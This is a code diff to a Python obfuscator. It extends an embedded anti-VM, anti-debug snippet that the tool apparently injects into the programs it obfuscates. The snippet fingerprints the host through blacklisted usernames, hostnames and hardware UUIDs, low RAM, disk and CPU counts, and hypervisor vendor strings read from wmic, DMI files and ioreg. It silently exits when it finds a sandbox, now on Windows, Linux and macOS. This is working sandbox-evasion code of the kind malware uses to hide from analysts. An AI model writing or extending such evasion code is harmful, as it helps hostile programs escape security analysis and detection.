@@ -34,14 +34,24 @@ inbuilt_types = [
     __build_class__, __import__, __loader__, __name__, __package__, __spec__, __builtins__, __file__,
 ]
 
+# Attribute/method names that belong to built-in types (list.append, dict.keys,
+# str methods, dunders, ...). The obfuscator must NOT rename these — it can't
+# rename their definition to match, so renaming would break the call.
+builtin_members = set()
+for _t in (object, list, dict, set, frozenset, tuple, str, bytes, bytearray,
+           int, float, complex, bool, type, range, enumerate, zip, map, filter):
+    builtin_members.update(dir(_t))
+
 ########################################################################################################################
 allowed_shuffle_types = ['normal', 'nonlatin', 'mini']
 
 antivm_code = """import os
-import winreg
+import socket
+import getpass
+import platform
 import threading
-import psutil
 import subprocess
+import psutil
 class AntiDebug:
     inVM = False
     def __init__(self):
@@ -61,7 +71,8 @@ class AntiDebug:
                                  "67E595EB-54AC-4FF0-B5E3-3DA7C7B547E3", "C7D23342-A5D4-68A1-59AC-CF40F735B363", "63203342-0EB0-AA1A-4DF5-3FB37DBB0670",
                                  "44B94D56-65AB-DC02-86A0-98143A7423BF", "6608003F-ECE4-494E-B07E-1C4615D1D93C", "D9142042-8F51-5EFF-D5F8-EE9AE3D1602A",
                                  "49434D53-0200-9036-2500-369025003AF0", "8B4E8278-525C-7343-B825-280AEBCD3BCB", "4D4DDC94-E06C-44F4-95FE-33A1ADA5AC27"]
-        for func in [self.listCheck, self.registryCheck, self.specsCheck]:
+        self.system = platform.system()
+        for func in [self.listCheck, self.specsCheck, self.vmCheck]:
             process = threading.Thread(target=func, daemon=True)
             self.processes.append(process)
             process.start()
@@ -72,43 +83,87 @@ class AntiDebug:
                 continue
     def programExit(self):
         self.__class__.inVM = True
-    def listCheck(self):
-        for path in [r'D:\\Tools', r'D:\\OS2', r'D:\\NT3X']:
-            if os.path.exists(path):
-                self.programExit()
-        for user in self.blackListedUsers:
-            if os.getlogin() == user:
-                self.programExit()
-        for pcName in self.blackListedPCNames:
-            if os.getenv("COMPUTERNAME") == pcName:
-                self.programExit()
+    def run_cmd(self, cmd):
         try:
-            myHWID = subprocess.check_output(r"wmic csproduct get uuid", creationflags=0x08000000).decode().split('\\n')[1].strip()
+            kwargs = {"stderr": subprocess.DEVNULL}
+            if self.system == "Windows":
+                kwargs["creationflags"] = 0x08000000
+            return subprocess.check_output(cmd, **kwargs).decode(errors="ignore")
         except Exception:
-            myHWID = ""
-        for hwid in self.blackListedHWIDS:
-            if myHWID == hwid:
-                self.programExit()
-    def specsCheck(self):
-        if int(str(psutil.virtual_memory()[0] / 1024 ** 3).split(".")[0]) <= 2:
-            self.programExit()
-        if int(str(psutil.disk_usage('/')[0] / 1024 ** 3).split(".")[0]) <= 50:
-            self.programExit()
-        if int(psutil.cpu_count()) <= 1:
-            self.programExit()
-    def registryCheck(self):
-        reg1 = os.system("REG QUERY HKEY_LOCAL_MACHINE\\\\SYSTEM\\\\ControlSet001\\\\Control\\\\Class\\\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\\\0000\\\\DriverDesc 2> nul")
-        reg2 = os.system("REG QUERY HKEY_LOCAL_MACHINE\\\\SYSTEM\\\\ControlSet001\\\\Control\\\\Class\\\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\\\0000\\\\ProviderName 2> nul")
-        if (reg1 and reg2) != 1:
-            self.programExit()
-
-        handle = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, 'SYSTEM\\CurrentControlSet\\Services\\Disk\\Enum')
+            return ""
+    def get_hwid(self):
+        if self.system == "Windows":
+            out = self.run_cmd("wmic csproduct get uuid")
+            lines = [line.strip() for line in out.splitlines() if line.strip()]
+            return lines[1] if len(lines) > 1 else ""
+        if self.system == "Linux":
+            for path in ("/sys/class/dmi/id/product_uuid", "/etc/machine-id", "/var/lib/dbus/machine-id"):
+                try:
+                    with open(path) as handle:
+                        value = handle.read().strip()
+                    if value:
+                        return value
+                except OSError:
+                    continue
+            return ""
+        if self.system == "Darwin":
+            out = self.run_cmd(["ioreg", "-rd1", "-c", "IOPlatformExpertDevice"])
+            for line in out.splitlines():
+                if "IOPlatformUUID" in line:
+                    return line.split("=")[-1].strip().strip('"')
+        return ""
+    def listCheck(self):
         try:
-            reg_val = winreg.QueryValueEx(handle, '0')[0]
-            if ("VMware" or "VBOX") in reg_val:
+            if getpass.getuser() in self.blackListedUsers:
                 self.programExit()
-        finally:
-            winreg.CloseKey(handle)
-if AntiDebug().inVM():
+        except Exception:
+            pass
+        if socket.gethostname() in self.blackListedPCNames:
+            self.programExit()
+        if os.getenv("COMPUTERNAME") in self.blackListedPCNames:
+            self.programExit()
+        if self.get_hwid().upper() in self.blackListedHWIDS:
+            self.programExit()
+    def specsCheck(self):
+        try:
+            if (os.cpu_count() or 2) <= 1:
+                self.programExit()
+        except Exception:
+            pass
+        try:
+            if psutil.virtual_memory().total / 1024 ** 3 <= 2:
+                self.programExit()
+        except Exception:
+            pass
+        try:
+            if psutil.disk_usage(os.getcwd()).total / 1024 ** 3 <= 50:
+                self.programExit()
+        except Exception:
+            pass
+    def vmCheck(self):
+        vendors = ("vmware", "virtualbox", "vbox", "qemu", "kvm", "xen", "hyper-v", "hyperv", "parallels", "bochs", "sandbox")
+        blob = ""
+        if self.system == "Windows":
+            blob = self.run_cmd("wmic computersystem get manufacturer,model") + self.run_cmd("wmic bios get serialnumber,version")
+        elif self.system == "Linux":
+            for path in ("/sys/class/dmi/id/product_name", "/sys/class/dmi/id/sys_vendor", "/sys/class/dmi/id/board_vendor", "/sys/class/dmi/id/bios_vendor"):
+                try:
+                    with open(path) as handle:
+                        blob += " " + handle.read()
+                except OSError:
+                    continue
+            try:
+                with open("/proc/cpuinfo") as handle:
+                    if "hypervisor" in handle.read().lower():
+                        self.programExit()
+            except OSError:
+                pass
+        elif self.system == "Darwin":
+            blob = self.run_cmd(["system_profiler", "SPHardwareDataType"]) + self.run_cmd(["ioreg", "-l"])
+        blob = blob.lower()
+        for vendor in vendors:
+            if vendor in blob:
+                self.programExit()
+if AntiDebug().inVM:
     os._exit(0)
 """
